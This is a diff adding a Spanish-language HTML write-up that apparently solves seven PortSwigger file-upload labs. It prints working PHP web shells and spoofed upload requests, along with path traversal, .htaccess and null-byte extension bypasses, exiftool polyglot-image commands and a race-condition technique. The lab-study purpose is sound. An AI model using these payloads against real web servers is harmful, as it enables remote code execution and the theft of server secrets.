@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>File Upload | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="../writeups/writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../portswigger.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">File Upload</span>
+        <span class="badge bg-secondary">RCE</span>
+        <span class="badge bg-secondary">Extension Bypass</span>
+        <span class="badge bg-secondary">Race Condition</span>
+        <span class="badge bg-secondary">Polyglot</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">File Upload Vulnerabilities</h1>
+      <p class="text-secondary mb-0">7 laboratorios: desde webshells básicas hasta race conditions y polyglot files.</p>
+    </div>
+
+    <!-- Lab 1 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-1-circle"></i> Lab 1 — Remote code execution via web shell upload</h4>
+      <p class="text-secondary">Sin restricciones de tipo de archivo. Subida directa de webshell PHP.</p>
+      <div class="row g-2 mb-3">
+        <div class="col-md-6">
+          <div class="code-block h-100">
+            <div class="code-header"><span class="text-warning">PHP webshell — RCE</span></div>
+            <pre><code>&lt;?php echo system($_GET['cmd']); ?&gt;</code></pre>
+          </div>
+        </div>
+        <div class="col-md-6">
+          <div class="code-block h-100">
+            <div class="code-header"><span class="text-warning">PHP webshell — File read</span></div>
+            <pre><code>&lt;?php echo file_get_contents('/path/to/target/file'); ?&gt;</code></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Lab 2 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-2-circle"></i> Lab 2 — Web shell upload via Content-Type restriction bypass</h4>
+      <p class="text-secondary">El servidor valida el <code>Content-Type</code> del multipart. Cambiar a <code>image/jpeg</code> para bypassear.</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">POST /my-account/avatar</span></div>
+        <pre><code>------WebKitFormBoundary1zH0L1Kdn5yMtB7c
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+
+&lt;?php echo system($_GET['cmd']); ?&gt;
+------WebKitFormBoundary1zH0L1Kdn5yMtB7c</code></pre>
+      </div>
+      <img src="img/file-upload/00.png" class="img-fluid rounded border border-secondary" alt="Content-Type bypass">
+    </section>
+
+    <!-- Lab 3 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-3-circle"></i> Lab 3 — Web shell upload via path traversal</h4>
+      <p class="text-secondary">El directorio de uploads no ejecuta PHP. Usar <code>..%2f</code> en el filename para subir al directorio padre.</p>
+      <img src="img/file-upload/01.png" class="img-fluid rounded border border-secondary mb-3" alt="Path traversal upload">
+      <div class="code-block">
+        <div class="code-header"><span class="text-success">Filename con path traversal URL-encoded</span></div>
+        <pre><code>Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+Content-Type: application/octet-stream
+
+&lt;?php echo system($_GET['cmd']); ?&gt;</code></pre>
+      </div>
+    </section>
+
+    <!-- Lab 4 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-4-circle"></i> Lab 4 — Web shell upload via extension blacklist bypass (.htaccess)</h4>
+      <p class="text-secondary">Subir un <code>.htaccess</code> que registra la extensión <code>.shell</code> como PHP, luego subir el payload con esa extensión.</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">Paso 1 — Subir .htaccess</span></div>
+        <pre><code>Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .shell</code></pre>
+      </div>
+      <img src="img/file-upload/02.png" class="img-fluid rounded border border-secondary mb-3" alt="htaccess upload">
+      <p class="text-secondary">Subir ahora el archivo <code>.shell</code>:</p>
+      <img src="img/file-upload/03.png" class="img-fluid rounded border border-secondary mb-3" alt="shell extension upload">
+      <img src="img/file-upload/04.png" class="img-fluid rounded border border-secondary" alt="shell execution result">
+    </section>
+
+    <!-- Lab 5 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-5-circle"></i> Lab 5 — Web shell upload via obfuscated file extension</h4>
+      <img src="img/file-upload/05.png" class="img-fluid rounded border border-secondary mb-3" alt="Obfuscated extension">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">Null byte en filename</span></div>
+        <pre><code>Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
+Content-Type: image/jpeg
+
+&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></pre>
+      </div>
+      <img src="img/file-upload/06.png" class="img-fluid rounded border border-secondary mb-3" alt="Null byte bypass result">
+
+      <div class="alert-custom border-left-info p-3 rounded">
+        <h6 class="text-info mb-2"><i class="bi bi-lightbulb me-2"></i>Otras técnicas de ofuscación de extensión</h6>
+        <ul class="text-secondary small mb-0">
+          <li>Múltiples extensiones: <code>exploit.php.jpg</code></li>
+          <li>Caracteres finales: <code>exploit.php.</code> o <code>exploit.php </code></li>
+          <li>URL encoding del punto: <code>exploit%2Ephp</code></li>
+          <li>Punto y coma / null byte: <code>exploit.asp;.jpg</code> / <code>exploit.asp%00.jpg</code></li>
+          <li>Caracteres Unicode multibyte que normalizan a <code>.</code></li>
+          <li>Eliminación no recursiva: <code>exploit.p.phphp</code> → <code>exploit.p.php</code></li>
+          <li>Case variation si la blacklist es case-sensitive: <code>exploit.pHp</code></li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Lab 6 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-6-circle"></i> Lab 6 — Remote code execution via polyglot web shell upload</h4>
+      <p class="text-secondary">El servidor verifica que el archivo sea una imagen válida leyendo los magic bytes. Usar <code>exiftool</code> para incrustar el payload PHP como metadato de una imagen real.</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">exiftool — Comment field</span></div>
+        <pre><code>exiftool -Comment="&lt;?php echo 'start '.file_get_contents('/home/carlos/secret').' end'; ?&gt;" hackercat.jpg -o exploit.php</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">exiftool — DocumentName field</span></div>
+        <pre><code>exiftool -documentname='&lt;?php passthru($_GET["cmd"]); _halt_compiler(); ?&gt;' flower.jpg</code></pre>
+      </div>
+      <img src="img/file-upload/07.png" class="img-fluid rounded border border-secondary mb-3" alt="Polyglot exiftool">
+      <img src="img/file-upload/08.png" class="img-fluid rounded border border-secondary" alt="Polyglot result">
+    </section>
+
+    <!-- Lab 7 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-7-circle"></i> Lab 7 — Web shell upload via race condition</h4>
+      <p class="text-secondary">El servidor sube el archivo, lo valida y lo elimina si no pasa. La ventana de tiempo entre la subida y la eliminación permite ejecutarlo.</p>
+      <img src="img/file-upload/09.png" class="img-fluid rounded border border-secondary mb-3" alt="Race condition setup">
+      <img src="img/file-upload/10.png" class="img-fluid rounded border border-secondary mb-3" alt="Race condition request grouping">
+      <p class="text-secondary">Agrupar las requests en Burp Suite Repeater para enviarlas en paralelo:</p>
+      <img src="img/file-upload/11.png" class="img-fluid rounded border border-secondary mb-3" alt="Parallel requests">
+      <p class="text-secondary">Enviar en forma paralela (Send group in parallel):</p>
+      <img src="img/file-upload/12.png" class="img-fluid rounded border border-secondary mb-3" alt="Send in parallel">
+      <p class="text-secondary">Esperar la respuesta antes de que el servidor elimine el archivo:</p>
+      <img src="img/file-upload/13.png" class="img-fluid rounded border border-secondary" alt="Race condition success">
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
